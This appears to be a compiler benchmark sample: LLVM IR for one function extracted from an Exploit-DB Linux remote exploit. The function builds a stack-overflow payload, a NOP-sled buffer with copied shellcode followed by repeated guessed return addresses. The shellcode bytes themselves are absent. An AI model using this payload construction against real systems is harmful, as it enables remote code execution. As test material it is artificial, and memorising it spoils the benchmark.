; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19096.c__fill_hostile_buffer.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_19096.c__fill_hostile_buffer.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__offset = common dso_local global i32 0, align 4
@code = common dso_local global i32 0, align 4
@__EXPORTFS = common dso_local global i8* null, align 8
@stderr = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [38 x i8] c"code length = %d, used retaddr is %x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @_fill_hostile_buffer(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  %6 = call i32 (...) @get_esp()
  %7 = load i32, i32* @__offset, align 4
  %8 = add i32 %6, %7
  store i32 %8, i32* %4, align 4
  %9 = load i8*, i8** %2, align 8
  %10 = call i32 @memset(i8* %9, i32 144, i32 1024)
  %11 = load i32, i32* @code, align 4
  %12 = call i32 @strlen(i32 %11)
  store i32 %12, i32* %5, align 4
  %13 = load i8*, i8** %2, align 8
  %14 = getelementptr inbounds i8, i8* %13, i64 1024
  %15 = load i32, i32* %5, align 4
  %16 = sext i32 %15 to i64
  %17 = sub i64 0, %16
  %18 = getelementptr inbounds i8, i8* %14, i64 %17
  %19 = getelementptr inbounds i8, i8* %18, i64 -40
  %20 = load i8*, i8** @__EXPORTFS, align 8
  %21 = ptrtoint i8* %19 to i64
  %22 = ptrtoint i8* %20 to i64
  %23 = sub i64 %21, %22
  %24 = trunc i64 %23 to i32
  %25 = load i32, i32* @code, align 4
  %26 = load i32, i32* %5, align 4
  %27 = call i32 @memcpy(i32 %24, i32 %25, i32 %26)
  %28 = load i8*, i8** %2, align 8
  %29 = getelementptr inbounds i8, i8* %28, i64 1024
  %30 = getelementptr inbounds i8, i8* %29, i64 -40
  %31 = load i8*, i8** @__EXPORTFS, align 8
  %32 = ptrtoint i8* %30 to i64
  %33 = ptrtoint i8* %31 to i64
  %34 = sub i64 %32, %33
  %35 = inttoptr i64 %34 to i8*
  store i8* %35, i8** %3, align 8
  br label %36

36:                                               ; preds = %41, %1
  %37 = load i8*, i8** %3, align 8
  %38 = load i8*, i8** %2, align 8
  %39 = getelementptr inbounds i8, i8* %38, i64 1024
  %40 = icmp ult i8* %37, %39
  br i1 %40, label %41, label %47

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  %43 = load i8*, i8** %3, align 8
  %44 = bitcast i8* %43 to i32*
  store i32 %42, i32* %44, align 4
  %45 = load i8*, i8** %3, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 4
  store i8* %46, i8** %3, align 8
  br label %36

47:                                               ; preds = %36
  %48 = load i8*, i8** %2, align 8
  %49 = getelementptr inbounds i8, i8* %48, i64 1023
  store i8 0, i8* %49, align 1
  %50 = load i32, i32* @stderr, align 4
  %51 = load i32, i32* %5, align 4
  %52 = load i32, i32* %4, align 4
  %53 = call i32 @fprintf(i32 %50, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str, i64 0, i64 0), i32 %51, i32 %52)
  ret void
}

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i32) #1

declare dso_local i32 @memcpy(i32, i32, i32) #1

declare dso_local i32 @fprintf(i32, i8*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
